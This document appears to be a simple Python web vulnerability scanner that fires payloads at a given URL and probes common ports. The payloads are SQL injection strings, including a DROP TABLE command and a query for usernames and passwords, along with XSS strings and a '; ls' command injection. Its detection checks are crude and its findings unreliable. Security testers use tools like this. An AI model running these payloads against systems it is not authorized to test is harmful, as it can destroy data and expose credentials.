import sys
import requests
import argparse
import threading
from queue import Queue
import socket
from urllib.parse import urlparse

# Global lock for printing in threads
print_lock = threading.Lock()

# Function to display the banner
def display_banner():
    print("ZETA-Web")
    print("BY - TEAM-ZETA")
    print("UZAIR AMJAD\n")

# Function to print messages in verbose mode
def vprint(verbose, message):
    if verbose:
        with print_lock:
            print(message)

# Ensure URL has a scheme (http or https)
def normalize_url(url):
    if not urlparse(url).scheme:
        url = f"http://{url}"
    return url

# Test for SQL Injection
def test_sql_injection(url, verbose):
    payloads = [
        "' OR 1=1--", "' OR 'a'='a", "' OR '1'='1'--", "' OR 'a'='a'--",
        "1' AND 1=1--", "' OR '1'='1' #", "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' OR 1=1 --", "' HAVING 1=1 --"
    ]
    for payload in payloads:
        test_url = url + payload
        vprint(verbose, f"Testing SQL Injection with payload: {payload}")
        try:
            response = requests.get(test_url, timeout=5)
            if "Warning:" in response.text or "Error" in response.text:
                vprint(verbose, f"SQL Injection detected with payload: {payload}")
                return True
        except requests.RequestException as e:
            vprint(verbose, f"Error testing SQL Injection: {e}")
    return False

# Test for XSS
def test_xss(url, verbose):
    payloads = [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
        "'><script>alert('XSS')</script>", "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>",
        "<input type=text value='><script>alert(1)</script>'>"
    ]
    for payload in payloads:
        test_url = url + payload
        vprint(verbose, f"Testing XSS with payload: {payload}")
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                vprint(verbose, f"XSS detected with payload: {payload}")
                return True
        except requests.RequestException as e:
            vprint(verbose, f"Error testing XSS: {e}")
    return False

# Test for Command Injection
def test_command_injection(url, verbose):
    payload = "; ls"
    test_url = url + payload
    vprint(verbose, f"Testing Command Injection with payload: {payload}")
    try:
        response = requests.get(test_url, timeout=5)
        if "ls" in response.text:
            vprint(verbose, "Command Injection detected")
            return True
    except requests.RequestException as e:
        vprint(verbose, f"Error testing Command Injection: {e}")
    return False

# Scan ports
def scan_ports(host, verbose):
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        143: "IMAP",
        443: "HTTPS",
        3389: "RDP",
    }
    open_ports = []
    for port, service in common_ports.items():
        try:
            vprint(verbose, f"Scanning port {port} ({service})")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                if sock.connect_ex((host, port)) == 0:
                    open_ports.append((port, service))
                    vprint(verbose, f"Port {port} ({service}) is open")
        except socket.error as e:
            vprint(verbose, f"Error scanning port {port}: {e}")
    return open_ports

# Generate report
def generate_report(domain, vulnerabilities):
    report_filename = f"{domain}_report.txt"
    with open(report_filename, 'w', encoding='utf-8') as f:
        f.write(f"Web Vulnerability Scan Report\n")
        f.write(f"Target Domain: {domain}\n\n")
        f.write("SQL Injection Vulnerabilities:\n")
        f.write("Vulnerable\n" if vulnerabilities['sql_injection'] else "Not Vulnerable\n")
        f.write("\nXSS Vulnerabilities:\n")
        f.write("Vulnerable\n" if vulnerabilities['xss'] else "Not Vulnerable\n")
        f.write("\nCommand Injection Vulnerabilities:\n")
        f.write("Vulnerable\n" if vulnerabilities['command_injection'] else "Not Vulnerable\n")
        f.write("\nOpen Ports:\n")
        for port, service in vulnerabilities['open_ports']:
            f.write(f"Port {port} ({service}) is open\n")
    print(f"Report saved to {report_filename}")

# Worker function for threading
def scan_worker(task_queue, vulnerabilities, verbose):
    while not task_queue.empty():
        test, args = task_queue.get()
        result = test(*args)
        vulnerabilities[test.__name__.replace('test_', '')] = result
        task_queue.task_done()

# Main function
def main():
    display_banner()

    parser = argparse.ArgumentParser(description='Pro-Level Web Vulnerability Scanner with Threading')
    parser.add_argument('-host', '--host', required=True, help='Target URL, domain, or IP')
    parser.add_argument('-t', '--threads', type=int, default=4, help='Number of threads (default: 4)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')

    args = parser.parse_args()

    host = normalize_url(args.host)
    threads = args.threads
    verbose = args.verbose

    # Initialize vulnerabilities dictionary
    vulnerabilities = {}

    # Queue for tasks
    task_queue = Queue()

    # Add scanning tasks to the queue
    task_queue.put((test_sql_injection, (host, verbose)))
    task_queue.put((test_xss, (host, verbose)))
    task_queue.put((test_command_injection, (host, verbose)))

    # Start threads
    for _ in range(threads):
        threading.Thread(target=scan_worker, args=(task_queue, vulnerabilities, verbose), daemon=True).start()

    # Wait for all tasks to complete
    task_queue.join()

    # Perform port scanning
    host_domain = urlparse(host).hostname or host
    vulnerabilities['open_ports'] = scan_ports(host_domain, verbose)

    # Generate a report
    generate_report(host_domain, vulnerabilities)

if __name__ == "__main__":
    main()
